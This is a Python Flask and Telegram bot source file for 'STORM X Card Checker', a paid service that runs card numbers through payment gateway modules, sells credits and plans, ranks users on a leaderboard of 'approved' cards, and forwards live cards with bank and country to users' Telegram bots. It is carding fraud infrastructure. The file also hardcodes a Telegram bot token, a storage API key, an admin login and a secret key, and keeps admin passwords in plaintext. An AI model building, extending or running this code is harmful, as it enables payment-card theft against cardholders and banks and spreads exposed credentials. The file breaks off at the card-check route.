from flask import Flask, Response, render_template, request, jsonify, session, send_file, stream_with_context, redirect, url_for
from flask import Response, stream_with_context, request, session, jsonify
from au import process_card_au
from chk import check_card
from vbv import check_vbv_card
from b3 import process_card_b3
from svb import process_card_svb
from pp import process_card_pp
import random
import json
import threading
import time
import sys
import uuid
from datetime import datetime
import requests
import io
import sqlite3
import telebot
from telebot import types
import os
import re
import secrets
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'storm_x_secret_key_2025'

# Cloud Storage Configuration
JSON_API_URL = "https://json-api.stormx.pw"
API_KEY = "DARK-STORMX-DEEPX"

# File names for cloud storage
USERS_FILE = "St_users"
ACCESS_LOGS_FILE = "St_access_logs"
CARD_LOGS_FILE = "St_card_logs"
ONLINE_USERS_FILE = "St_online_users"
STATS_FILE = "St_stats"
LEADERBOARD_FILE = "St_leaderboard"
# Add these with your other file definitions
ADMINS_FILE = "St_admins"
PLANS_FILE = "St_plans"
REDEEM_CODES_FILE = "St_redeem_codes"
USER_PLANS_FILE = "St_user_plans"
ADMIN_LOGS_FILE = "St_admin_logs"

def load_json(file_name, default_data):
    """Load data from cloud JSON storage"""
    try:
        response = requests.get(f"{JSON_API_URL}/read?file={file_name}.json", timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Ensure we return the expected data type
            if isinstance(data, (dict, list)):
                return data
    except Exception as e:
        print(f"Error loading {file_name}: {e}")
    
    return default_data

def save_json(file_name, data):
    """Save data to cloud JSON storage"""
    try:
        response = requests.post(
            f"{JSON_API_URL}/write?file={file_name}.json",
            headers={
                "Content-Type": "application/json",
                "X-API-Key": API_KEY
            },
            json=data,
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error saving {file_name}: {e}")
        return False

def init_cloud_storage():
    """Initialize cloud storage with default data if needed"""
    # Initialize users
    users = load_json(USERS_FILE, {})
    if not users:
        save_json(USERS_FILE, {})
    
    # Initialize access logs
    access_logs = load_json(ACCESS_LOGS_FILE, [])
    if not access_logs:
        save_json(ACCESS_LOGS_FILE, [])
    
    # Initialize card logs
    card_logs = load_json(CARD_LOGS_FILE, [])
    if not card_logs:
        save_json(CARD_LOGS_FILE, [])
    
    # Initialize online users
    online_users = load_json(ONLINE_USERS_FILE, {})
    if not online_users:
        save_json(ONLINE_USERS_FILE, {})
    
    # Initialize stats
    stats = load_json(STATS_FILE, {
        'total_checks': 0,
        'total_approved': 0,
        'total_declined': 0,
        'live_users': 0,
        'peak_users': 0
    })
    save_json(STATS_FILE, stats)
    
    # Initialize leaderboard
    leaderboard = load_json(LEADERBOARD_FILE, {
        'top_checkers': [],
        'top_approvers': [],
        'last_updated': None
    })
    save_json(LEADERBOARD_FILE, leaderboard)
    
    # Initialize admin files
    admins = load_json(ADMINS_FILE, {})
    if not admins:
        # Create default owner
        admins['owner'] = {
            'username': 'Thedarkagain',
            'password': 'Darkkboy336',  # Your new password
            'role': 'owner',
            'created_at': datetime.now().isoformat(),
            'permissions': ['all']
        }
        save_json(ADMINS_FILE, admins)
    
    plans = load_json(PLANS_FILE, {})
    if not plans:
        save_json(PLANS_FILE, {})
    
    save_json(REDEEM_CODES_FILE, {})
    save_json(USER_PLANS_FILE, {})
    save_json(ADMIN_LOGS_FILE, [])

# -----------------------
# Cloud Database Functions
# -----------------------
def get_user_by_telegram_id(telegram_id):
    users = load_json(USERS_FILE, {})
    return users.get(str(telegram_id))

def ensure_users_format():
    """Ensure users data is in the correct dictionary format"""
    users = load_json(USERS_FILE, {})
    
    # If users is already a dict, return it
    if isinstance(users, dict):
        return users
    
    # If users is a list, convert to dictionary
    if isinstance(users, list):
        users_dict = {}
        for user in users:
            if isinstance(user, dict) and 'telegram_id' in user:
                users_dict[str(user['telegram_id'])] = user
        save_json(USERS_FILE, users_dict)
        return users_dict
    
    # If it's something else, return empty dict
    return {}
    
def get_user_by_access_key(access_key):
    users = load_json(USERS_FILE, {})
    
    # If users is a list, convert to dictionary format
    if isinstance(users, list):
        users = ensure_users_format()
    
    # Now search for user with matching access key
    for user_id, user_data in users.items():
        if isinstance(user_data, dict) and user_data.get('access_key') == access_key:
            return user_data
    
    return None

init_cloud_storage()
ensure_users_format()
# Telegram Bot Setup
TELEGRAM_BOT_TOKEN = "8415037768:AAE3V0UXxziP1VgqZnwNkUIM2HCagT18fgk"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Store results temporarily
results = {}
result_lock = threading.Lock()

# Online users tracking
online_users = {}
online_users_lock = threading.Lock()

# Add these admin functions after your existing functions

def verify_admin(username, password):
    """Verify admin credentials against stored admin data"""
    admins = load_json(ADMINS_FILE, {})
    
    # Search through all admins
    for admin_id, admin_data in admins.items():
        if (admin_data.get('username') == username and 
            admin_data.get('password') == password):
            # Add admin ID to the returned data
            admin_data['id'] = admin_id
            return admin_data
    
    return None

def create_plan(plan_id, name, credits_per_day, validity_days, price=0, active=True):
    plans = load_json(PLANS_FILE, {})
    plans[plan_id] = {
        'name': name,
        'credits_per_day': int(credits_per_day),
        'validity_days': int(validity_days),
        'price': float(price),
        'active': bool(active),
        'created_at': datetime.now().isoformat()
    }
    return save_json(PLANS_FILE, plans)

def update_plan(plan_id, **kwargs):
    plans = load_json(PLANS_FILE, {})
    if plan_id in plans:
        plans[plan_id].update(kwargs)
        return save_json(PLANS_FILE, plans)
    return False

def delete_plan(plan_id):
    plans = load_json(PLANS_FILE, {})
    if plan_id in plans:
        del plans[plan_id]
        return save_json(PLANS_FILE, plans)
    return False

def get_all_plans():
    return load_json(PLANS_FILE, {})

def generate_redeem_code(credits, expires_days=30, max_uses=1, created_by=""):
    redeem_codes = load_json(REDEEM_CODES_FILE, {})
    code = secrets.token_hex(8).upper()
    redeem_codes[code] = {
        'credits': int(credits),
        'created_at': datetime.now().isoformat(),
        'expires_at': (datetime.now() + timedelta(days=expires_days)).isoformat(),
        'max_uses': int(max_uses),
        'used_count': 0,
        'created_by': created_by,
        'used_by': []
    }
    save_json(REDEEM_CODES_FILE, redeem_codes)
    return code

def redeem_code(code, user_id):
    redeem_codes = load_json(REDEEM_CODES_FILE, {})
    if code in redeem_codes:
        code_data = redeem_codes[code]
        
        # Check if expired
        if datetime.now() > datetime.fromisoformat(code_data['expires_at']):
            return False, "Code has expired"
        
        # Check if max uses reached
        if code_data['used_count'] >= code_data['max_uses']:
            return False, "Code has been used maximum times"
        
        # Check if user already used this code
        if user_id in code_data['used_by']:
            return False, "You have already used this code"
        
        # Apply credits
        users = load_json(USERS_FILE, {})
        if str(user_id) in users:
            users[str(user_id)]['credits'] = users[str(user_id)].get('credits', 0) + code_data['credits']
            save_json(USERS_FILE, users)
            
            # Update code usage
            code_data['used_count'] += 1
            code_data['used_by'].append(user_id)
            redeem_codes[code] = code_data
            save_json(REDEEM_CODES_FILE, redeem_codes)
            
            return True, f"Successfully redeemed {code_data['credits']} credits"
    
    return False, "Invalid redeem code"

def assign_plan_to_user(user_id, plan_id, admin_username):
    plans = get_all_plans()
    if plan_id not in plans:
        return False, "Plan not found"
    
    plan = plans[plan_id]
    user_plans = load_json(USER_PLANS_FILE, {})
    
    user_plans[str(user_id)] = {
        'plan_id': plan_id,
        'plan_name': plan['name'],
        'credits_per_day': plan['credits_per_day'],
        'assigned_at': datetime.now().isoformat(),
        'expires_at': (datetime.now() + timedelta(days=plan['validity_days'])).isoformat(),
        'assigned_by': admin_username,
        'last_credit_date': datetime.now().isoformat()
    }
    
    save_json(USER_PLANS_FILE, user_plans)
    return True, f"Plan {plan['name']} assigned successfully"

def add_credits_to_user(user_id, credits, admin_username):
    users = load_json(USERS_FILE, {})
    if str(user_id) in users:
        users[str(user_id)]['credits'] = users[str(user_id)].get('credits', 0) + int(credits)
        save_json(USERS_FILE, users)
        
        # Log the action
        log_admin_action(admin_username, f"Added {credits} credits to user {user_id}")
        return True, f"Added {credits} credits to user"
    return False, "User not found"

def get_all_users():
    return load_json(USERS_FILE, {})

def get_user_plans():
    return load_json(USER_PLANS_FILE, {})

def get_redeem_codes():
    return load_json(REDEEM_CODES_FILE, {})

def log_admin_action(admin_username, action):
    logs = load_json(ADMIN_LOGS_FILE, [])
    logs.append({
        'admin': admin_username,
        'action': action,
        'timestamp': datetime.now().isoformat()
    })
    # Keep only last 1000 logs
    if len(logs) > 1000:
        logs = logs[-1000:]
    save_json(ADMIN_LOGS_FILE, logs)

def add_admin(username, password, role='admin', permissions=None):
    admins = load_json(ADMINS_FILE, {})
    admin_id = str(len(admins) + 1)
    admins[admin_id] = {
        'username': username,
        'password': password,
        'role': role,
        'permissions': permissions or ['view_users', 'add_credits'],
        'created_at': datetime.now().isoformat()
    }
    return save_json(ADMINS_FILE, admins)

def get_admin_logs():
    return load_json(ADMIN_LOGS_FILE, [])

def save_user(user_data):
    users = load_json(USERS_FILE, {})
    telegram_id = str(user_data['telegram_id'])
    users[telegram_id] = user_data
    return save_json(USERS_FILE, users)

def update_user_credits(telegram_id, credit_change):
    users = load_json(USERS_FILE, {})
    user_id = str(telegram_id)
    if user_id in users:
        users[user_id]['credits'] = max(0, users[user_id].get('credits', 0) + credit_change)
        save_json(USERS_FILE, users)
        return users[user_id]['credits']
    return 0

def update_user_stats(telegram_id, status):
    users = load_json(USERS_FILE, {})
    user_id = str(telegram_id)
    if user_id in users:
        if status.lower() == 'approved':
            users[user_id]['approved_count'] = users[user_id].get('approved_count', 0) + 1
        else:
            users[user_id]['declined_count'] = users[user_id].get('declined_count', 0) + 1
        
        # Update total checks count
        users[user_id]['total_checks'] = users[user_id].get('total_checks', 0) + 1
        save_json(USERS_FILE, users)
        
        # Update leaderboard
        update_leaderboard()

def log_card(telegram_id, card_data, status, gateway, response, amount=None):
    card_logs = load_json(CARD_LOGS_FILE, [])
    card_logs.append({
        'telegram_id': telegram_id,
        'card_data': card_data,
        'status': status,
        'gateway': gateway,
        'response': response,
        'amount': amount,
        'created_at': datetime.now().isoformat()
    })
    # Keep only last 1000 logs to prevent file from growing too large
    if len(card_logs) > 1000:
        card_logs = card_logs[-1000:]
    save_json(CARD_LOGS_FILE, card_logs)
    
    # Update global stats
    stats = load_json(STATS_FILE, {
        'total_checks': 0,
        'total_approved': 0,
        'total_declined': 0,
        'live_users': 0,
        'peak_users': 0
    })
    stats['total_checks'] = stats.get('total_checks', 0) + 1
    if status.lower() == 'approved':
        stats['total_approved'] = stats.get('total_approved', 0) + 1
    else:
        stats['total_declined'] = stats.get('total_declined', 0) + 1
    save_json(STATS_FILE, stats)

def log_access(telegram_id, access_key, ip_address):
    access_logs = load_json(ACCESS_LOGS_FILE, [])
    access_logs.append({
        'telegram_id': telegram_id,
        'access_key': access_key,
        'ip_address': ip_address,
        'accessed_at': datetime.now().isoformat()
    })
    # Keep only last 500 access logs
    if len(access_logs) > 500:
        access_logs = access_logs[-500:]
    save_json(ACCESS_LOGS_FILE, access_logs)

def update_online_users(user_id, username, action="login"):
    """Update online users tracking"""
    with online_users_lock:
        online_users_data = load_json(ONLINE_USERS_FILE, {})
        
        # Ensure online_users_data is a dictionary
        if not isinstance(online_users_data, dict):
            online_users_data = {}
        
        if action == "login":
            online_users_data[str(user_id)] = {
                'username': username,
                'last_active': datetime.now().isoformat(),
                'ip': request.remote_addr,
                'login_time': datetime.now().isoformat()
            }
        elif action == "logout":
            online_users_data.pop(str(user_id), None)
        elif action == "update":
            if str(user_id) in online_users_data:
                online_users_data[str(user_id)]['last_active'] = datetime.now().isoformat()
        
        # Remove users inactive for more than 15 minutes
        current_time = datetime.now()
        to_remove = []
        for uid, data in online_users_data.items():
            # Ensure data is a dictionary
            if not isinstance(data, dict):
                to_remove.append(uid)
                continue
                
            try:
                last_active = datetime.fromisoformat(data.get('last_active', datetime.now().isoformat()))
                if (current_time - last_active).total_seconds() > 900:  # 15 minutes
                    to_remove.append(uid)
            except (ValueError, TypeError):
                to_remove.append(uid)
        
        for uid in to_remove:
            online_users_data.pop(uid, None)
        
        # Update live users count in stats
        stats = load_json(STATS_FILE, {})
        live_count = len(online_users_data)
        stats['live_users'] = live_count
        stats['peak_users'] = max(stats.get('peak_users', 0), live_count)
        save_json(STATS_FILE, stats)
        
        save_json(ONLINE_USERS_FILE, online_users_data)
        
        return live_count
        
def get_live_users_count():
    """Get current live users count"""
    online_users_data = load_json(ONLINE_USERS_FILE, {})
    return len(online_users_data)

def get_online_users():
    """Get detailed online users information"""
    online_users_data = load_json(ONLINE_USERS_FILE, {})
    users_data = load_json(USERS_FILE, {})
    
    online_users_list = []
    
    # Ensure online_users_data is a dictionary
    if not isinstance(online_users_data, dict):
        return online_users_list
    
    for user_id, online_data in online_users_data.items():
        # Skip if online_data is not a dictionary
        if not isinstance(online_data, dict):
            continue
            
        user_info = users_data.get(user_id, {})
        try:
            last_active = datetime.fromisoformat(online_data.get('last_active', datetime.now().isoformat()))
            minutes_ago = int((datetime.now() - last_active).total_seconds() / 60)
        except (ValueError, TypeError):
            minutes_ago = 0
        
        online_users_list.append({
            'user_id': user_id,
            'username': online_data.get('username', 'Unknown'),
            'first_name': user_info.get('first_name', ''),
            'last_active_minutes': minutes_ago,
            'ip': online_data.get('ip', ''),
            'total_checks': user_info.get('total_checks', 0),
            'approved_count': user_info.get('approved_count', 0)
        })
    
    # Sort by last active (most recent first)
    online_users_list.sort(key=lambda x: x['last_active_minutes'])
    return online_users_list

def update_leaderboard():
    """Update leaderboard with top users"""
    users = load_json(USERS_FILE, {})
    
    # Ensure users is a dictionary
    if not isinstance(users, dict):
        users = ensure_users_format()
    
    # Prepare user data for leaderboard
    user_stats = []
    for user_id, user_data in users.items():
        # Skip if user_data is not a dictionary
        if not isinstance(user_data, dict):
            continue
            
        total_checks = user_data.get('total_checks', 0)
        if total_checks > 0:  # Only include users with checks
            approved_count = user_data.get('approved_count', 0)
            user_stats.append({
                'user_id': user_id,
                'username': user_data.get('username') or user_data.get('first_name') or f"User_{user_id}",
                'total_checks': total_checks,
                'approved_count': approved_count,
                'approval_rate': (approved_count / total_checks) * 100 if total_checks > 0 else 0,
                'credits': user_data.get('credits', 0)
            })
    
    # Sort by total checks (descending)
    top_checkers = sorted(user_stats, key=lambda x: x['total_checks'], reverse=True)[:10]
    
    # Sort by approved count (descending)
    top_approvers = sorted(user_stats, key=lambda x: x['approved_count'], reverse=True)[:10]
    
    leaderboard_data = {
        'top_checkers': top_checkers,
        'top_approvers': top_approvers,
        'last_updated': datetime.now().isoformat()
    }
    
    save_json(LEADERBOARD_FILE, leaderboard_data)
    return leaderboard_data

def get_leaderboard():
    """Get current leaderboard data"""
    leaderboard = load_json(LEADERBOARD_FILE, {
        'top_checkers': [],
        'top_approvers': [],
        'last_updated': None
    })
    
    # Update if empty or older than 1 hour
    if not leaderboard.get('top_checkers') or not leaderboard.get('last_updated'):
        return update_leaderboard()
    
    try:
        last_updated = datetime.fromisoformat(leaderboard['last_updated'])
        if (datetime.now() - last_updated).total_seconds() > 3600:  # 1 hour
            return update_leaderboard()
    except (ValueError, TypeError):
        return update_leaderboard()
    
    return leaderboard

# -----------------------
# Telegram Bot Handlers
# -----------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Generate access key
    access_key = str(uuid.uuid4())[:8].upper()
    
    # Save user to cloud database
    user_data = {
        'telegram_id': message.from_user.id,
        'username': message.from_user.username,
        'first_name': message.from_user.first_name,
        'last_name': message.from_user.last_name,
        'access_key': access_key,
        'credits': 100,
        'bot_token': '',
        'chat_id': '',
        'approved_count': 0,
        'declined_count': 0,
        'total_checks': 0,
        'created_at': datetime.now().isoformat()
    }
    
    existing_user = get_user_by_telegram_id(message.from_user.id)
    if existing_user:
        access_key = existing_user.get('access_key', access_key)
    else:
        save_user(user_data)
    
    # Send welcome message with access key
    bot.reply_to(message, f"🚀 Welcome to STORM X Card Checker!\n\n"
                 f"Your Access Key: `{access_key}`\n\n"
                 f"Use this key to access the web panel. You have 100 free credits to start with!\n\n"
                 f"Web Panel: https://storm-x.onrender.com", parse_mode='Markdown')

@bot.message_handler(commands=['credits'])
def check_credits(message):
    user = get_user_by_telegram_id(message.from_user.id)
    credits = user.get('credits', 0) if user else 0
    bot.reply_to(message, f"Your current credits: {credits}")

# Start bot in a separate thread
def run_bot():
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Bot error: {e}")
        # Restart after a delay if there's an error
        time.sleep(10)
        run_bot()

bot_thread = threading.Thread(target=run_bot)
bot_thread.daemon = True
bot_thread.start()

# -----------------------
# Utility Functions
# -----------------------
def get_session_id():
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    return session['session_id']

def send_card_to_user_bot(telegram_id, result_entry):
    user = get_user_by_telegram_id(telegram_id)
    if not user or not user.get('bot_token') or not user.get('chat_id'):
        return  # user hasn't set bot yet

    bot_token = user['bot_token']
    chat_id = user['chat_id']

    amount_text = f"💰 Amount: ${result_entry.get('amount', 'N/A')}\n" if result_entry.get('amount') else ""
    
    msg = (
        f"✅ *Approved Card Found!*\n\n"
        f"💳 Card: `{result_entry['card']}`\n"
        f"📡 Gateway: {result_entry['gateway']}\n"
        f"📝 Response: {result_entry['response']}\n"
        f"{amount_text}"
        f"🏦 Bank: {result_entry['bin'].get('bank', '-')}\n"
        f"🌍 Country: {result_entry['bin'].get('country', '-')}\n"
        f"⏰ Time: {result_entry['timestamp']}"
    )

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"},
            timeout=10
        )
    except Exception as e:
        print(f"Failed to send message to user {telegram_id}: {e}")

# -----------------------
# Middleware to Check Access
# -----------------------
@app.before_request
def check_access():
    # Allow access to static files and login page
    if request.endpoint in ['static', 'login', 'verify_access']:
        return
    
    # Check if user has valid access key in session
    if 'access_key' not in session or 'telegram_id' not in session:
        return redirect(url_for('login'))
    
    # Verify the access key is still valid
    user = get_user_by_access_key(session['access_key'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    
    # Update online users
    update_online_users(session['telegram_id'], session.get('username'), "update")
    
    # Check if user has credits
    if user['credits'] <= 0 and request.endpoint not in ['profile', 'logout', 'index']:
        return redirect(url_for('profile'))

@app.route('/login')
def login():
    # If user is already logged in, redirect to home
    if 'telegram_id' in session and 'access_key' in session:
        # Verify the access key is still valid
        user = get_user_by_access_key(session['access_key'])
        if user:
            return redirect(url_for('index'))
    
    return render_template('login.html')

@app.route('/verify_access', methods=['POST'])
def verify_access():
    access_key = request.form.get('access_key', '').strip().upper()
    user = get_user_by_access_key(access_key)
    
    if user:
        session['access_key'] = access_key
        session['telegram_id'] = user['telegram_id']
        session['username'] = user.get('username') or user.get('first_name') or f"User_{user['telegram_id']}"
        session['credits'] = user.get('credits', 0)
        
        # Log the access
        log_access(user['telegram_id'], access_key, request.remote_addr)
        
        # Update online users
        update_online_users(user['telegram_id'], session['username'], "login")
        
        return jsonify({'success': True, 'message': 'Access granted!', 'redirect': url_for('index')})
    else:
        return jsonify({'success': False, 'message': 'Invalid access key!'})


@app.route('/logout')
def logout():
    # Update online users
    if 'telegram_id' in session:
        update_online_users(session['telegram_id'], session.get('username'), "logout")
    
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
def index():
    if 'telegram_id' not in session:
        return redirect(url_for('login'))
    
    # Get user stats
    user = get_user_by_telegram_id(session['telegram_id'])
    approved = user.get('approved_count', 0) if user else 0
    declined = user.get('declined_count', 0) if user else 0
    total = approved + declined
    
    # Get global stats
    stats = load_json(STATS_FILE, {
        'total_checks': 0,
        'total_approved': 0,
        'total_declined': 0,
        'live_users': 0,
        'peak_users': 0
    })
    
    # Get leaderboard data
    leaderboard = get_leaderboard()
    
    # Get online users
    online_users = get_online_users()
    
    return render_template('index.html', 
                          username=session.get('username'), 
                          credits=session.get('credits', 0),
                          approved_count=approved,
                          declined_count=declined,
                          total_checks=total,
                          live_users=stats.get('live_users', 0),
                          total_users_checks=stats.get('total_checks', 0),
                          leaderboard=leaderboard,
                          online_users=online_users)
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    # If admin is already logged in, redirect to admin dashboard
    if 'admin_username' in session:
        return redirect(url_for('admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Validate input
        if not username or not password:
            return jsonify({'success': False, 'message': 'Username and password are required'})
        
        # Verify admin credentials
        admin = verify_admin(username, password)
        if admin:
            # Set admin session
            session['admin_username'] = admin['username']
            session['admin_role'] = admin['role']
            session['admin_permissions'] = admin.get('permissions', [])
            session['admin_id'] = admin.get('id')  # Store admin ID if available
            
            # Log the admin login
            log_admin_action(username, "Admin logged in")
            
            return jsonify({
                'success': True, 
                'message': 'Login successful', 
                'redirect': url_for('admin_dashboard')
            })
        else:
            return jsonify({'success': False, 'message': 'Invalid username or password'})
    
    # GET request - show login form
    return render_template('admin_login.html')


@app.route('/admin/dashboard')
def admin_dashboard():
    # Check if admin is logged in
    if 'admin_username' not in session:
        return redirect(url_for('admin_login'))
    
    # Get statistics for dashboard
    stats = {
        'total_users': len(get_all_users()),
        'total_plans': len(get_all_plans()),
        'active_user_plans': len(get_user_plans()),
        'total_redeem_codes': len(get_redeem_codes()),
        'live_users': get_live_users_count(),
        'total_checks': load_json(STATS_FILE, {}).get('total_checks', 0),
        'total_approved': load_json(STATS_FILE, {}).get('total_approved', 0)
    }
    
    # Get recent admin logs (last 10)
    admin_logs = get_admin_logs()[-10:][::-1]  # Reverse to show latest first
    
    # Get recent card checks (last 10)
    card_logs = load_json(CARD_LOGS_FILE, [])[-10:][::-1]
    
    return render_template('admin_dashboard.html', 
                         stats=stats,
                         username=session['admin_username'],
                         role=session['admin_role'],
                         permissions=session['admin_permissions'],
                         admin_logs=admin_logs,
                         recent_checks=card_logs)


@app.route('/admin/logout')
def admin_logout():
    if 'admin_username' in session:
        # Log the logout action
        log_admin_action(session['admin_username'], "Admin logged out")
        
        # Clear admin session
        session.pop('admin_username', None)
        session.pop('admin_role', None)
        session.pop('admin_permissions', None)
        session.pop('admin_id', None)
    
    return redirect(url_for('admin_login'))


# Admin authentication middleware
@app.before_request
def check_admin_access():
    # Routes that don't require admin authentication
    admin_public_routes = ['admin_login', 'static']
    
    # Check if the request is for an admin route
    if request.endpoint and request.endpoint.startswith('admin_'):
        if request.endpoint not in admin_public_routes:
            if 'admin_username' not in session:
                return redirect(url_for('admin_login'))
            
            # Check permissions for specific admin routes
            admin_permissions = session.get('admin_permissions', [])
            
            # If user doesn't have 'all' permissions, check specific ones
            if 'all' not in admin_permissions:
                # Define permission requirements for each route
                permission_map = {
                    'admin_users': ['view_users', 'manage_users'],
                    'admin_plans': ['manage_plans'],
                    'admin_redeem_codes': ['manage_codes'],
                    'admin_logs': ['view_logs']
                }
                
                required_permissions = permission_map.get(request.endpoint, [])
                if required_permissions and not any(perm in admin_permissions for perm in required_permissions):
                    return jsonify({'success': False, 'message': 'Insufficient permissions'}), 403

# Admin Routes for Plans
@app.route('/admin/plans')
def admin_plans():
    if 'admin_username' not in session:
        return redirect(url_for('admin_login'))
    
    plans = get_all_plans()
    return render_template('admin_plans.html', plans=plans)

@app.route('/admin/create_plan', methods=['POST'])
def create_plan_route():
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    plan_id = request.form.get('plan_id')
    name = request.form.get('name')
    credits_per_day = request.form.get('credits_per_day')
    validity_days = request.form.get('validity_days')
    price = request.form.get('price', 0)
    
    if create_plan(plan_id, name, credits_per_day, validity_days, price):
        log_admin_action(session['admin_username'], f"Created plan: {name}")
        return jsonify({'success': True, 'message': 'Plan created successfully'})
    else:
        return jsonify({'success': False, 'message': 'Failed to create plan'})

@app.route('/admin/update_plan/<plan_id>', methods=['POST'])
def update_plan_route(plan_id):
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    data = request.get_json()
    if update_plan(plan_id, **data):
        log_admin_action(session['admin_username'], f"Updated plan: {plan_id}")
        return jsonify({'success': True, 'message': 'Plan updated successfully'})
    else:
        return jsonify({'success': False, 'message': 'Plan not found'})

@app.route('/admin/delete_plan/<plan_id>')
def delete_plan_route(plan_id):
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    if delete_plan(plan_id):
        log_admin_action(session['admin_username'], f"Deleted plan: {plan_id}")
        return jsonify({'success': True, 'message': 'Plan deleted successfully'})
    else:
        return jsonify({'success': False, 'message': 'Plan not found'})

# Admin Routes for Users
@app.route('/admin/users')
def admin_users():
    if 'admin_username' not in session:
        return redirect(url_for('admin_login'))
    
    users = get_all_users()
    user_plans = get_user_plans()
    return render_template('admin_users.html', users=users, user_plans=user_plans)

@app.route('/admin/add_credits', methods=['POST'])
def add_credits_route():
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    user_id = request.form.get('user_id')
    credits = request.form.get('credits')
    
    success, message = add_credits_to_user(user_id, credits, session['admin_username'])
    return jsonify({'success': success, 'message': message})

@app.route('/admin/assign_plan', methods=['POST'])
def assign_plan_route():
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    user_id = request.form.get('user_id')
    plan_id = request.form.get('plan_id')
    
    success, message = assign_plan_to_user(user_id, plan_id, session['admin_username'])
    return jsonify({'success': success, 'message': message})

# Admin Routes for Redeem Codes
@app.route('/admin/redeem_codes')
def admin_redeem_codes():
    if 'admin_username' not in session:
        return redirect(url_for('admin_login'))
    
    redeem_codes = get_redeem_codes()
    return render_template('admin_redeem_codes.html', redeem_codes=redeem_codes)

@app.route('/admin/generate_redeem_code', methods=['POST'])
def generate_redeem_code_route():
    if 'admin_username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    credits = request.form.get('credits')
    expires_days = request.form.get('expires_days', 30)
    max_uses = request.form.get('max_uses', 1)
    
    code = generate_redeem_code(credits, expires_days, max_uses, session['admin_username'])
    
    # Send to all users via bot
    users = get_all_users()
    for user_id, user_data in users.items():
        try:
            send_redeem_code_to_user(int(user_id), code, credits)
        except:
            continue
    
    log_admin_action(session['admin_username'], f"Generated redeem code: {code} for {credits} credits")
    return jsonify({'success': True, 'code': code, 'message': 'Redeem code generated and sent to all users'})

def send_redeem_code_to_user(telegram_id, code, credits):
    user = get_user_by_telegram_id(telegram_id)
    if user and user.get('chat_id'):
        try:
            message = f"🎉 *New Redeem Code Available!*\n\n" \
                     f"💰 Credits: {credits}\n" \
                     f"🔑 Code: `{code}`\n\n" \
                     f"*How to redeem:*\n" \
                     f"• Web: Go to Profile → Redeem Code\n" \
                     f"• Bot: Send `/redeem {code}`\n\n" \
                     f"⏰ Use it before it expires!"
            
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(
                url,
                json={
                    "chat_id": user['chat_id'], 
                    "text": message, 
                    "parse_mode": "Markdown"
                },
                timeout=10
            )
        except Exception as e:
            print(f"Failed to send redeem code to user {telegram_id}: {e}")

# Add redeem command to bot
@bot.message_handler(commands=['redeem'])
def redeem_code_bot(message):
    try:
        code = message.text.split()[1]
        success, result_message = redeem_code(code, message.from_user.id)
        
        if success:
            bot.reply_to(message, f"✅ {result_message}")
        else:
            bot.reply_to(message, f"❌ {result_message}")
    except IndexError:
        bot.reply_to(message, "❌ Usage: /redeem <code>")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Admin Routes for Logs
@app.route('/admin/logs')
def admin_logs():
    if 'admin_username' not in session:
        return redirect(url_for('admin_login'))
    
    logs = get_admin_logs()
    return render_template('admin_logs.html', logs=logs)

# Add redeem functionality to user profile
@app.route('/redeem_code', methods=['POST'])
def redeem_code_web():
    if 'telegram_id' not in session:
        return jsonify({'success': False, 'message': 'Please login first'})
    
    code = request.form.get('code')
    success, message = redeem_code(code, session['telegram_id'])
    return jsonify({'success': success, 'message': message})

@app.route('/get_leaderboard')
def get_leaderboard_route():
    """API endpoint to get leaderboard data"""
    leaderboard = get_leaderboard()
    return jsonify(leaderboard)

@app.route('/get_online_users')
def get_online_users_route():
    """API endpoint to get online users data"""
    online_users = get_online_users()
    return jsonify({'online_users': online_users})

@app.route('/single')
def single_check():
    return render_template('single.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/mass')
def mass_check_page():
    return render_template('mass.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/results')
def results_page():
    return render_template('results.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/bin_info', methods=['GET'])
def bin_info_page():
    return render_template('bin_info.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/bin_lookup', methods=['POST'])
def bin_lookup():
    bin_number = request.form.get('bin', '').strip()
    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
        res = requests.get(api_url, timeout=10)
        if res.status_code != 200:
            return jsonify({'success': False, 'error': 'BIN not found'})
        return jsonify({'success': True, 'data': res.json()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/profile')
def profile():
    if 'telegram_id' not in session:
        return redirect(url_for('login'))
    
    user = get_user_by_telegram_id(session['telegram_id'])
    
    # Get access logs
    access_logs = load_json(ACCESS_LOGS_FILE, [])
    user_access_logs = [log for log in access_logs if log.get('telegram_id') == session['telegram_id']][-5:]
    
    # Get recent card checks
    card_logs = load_json(CARD_LOGS_FILE, [])
    user_card_logs = [log for log in card_logs if log.get('telegram_id') == session['telegram_id']][-10:]
    
    return render_template(
        'profile.html',
        username=session.get('username'),
        credits=session.get('credits', 0),
        user=user,
        access_logs=user_access_logs,
        card_logs=user_card_logs
    )

@app.route('/check_card', methods=['POST'])
def check_card_route():
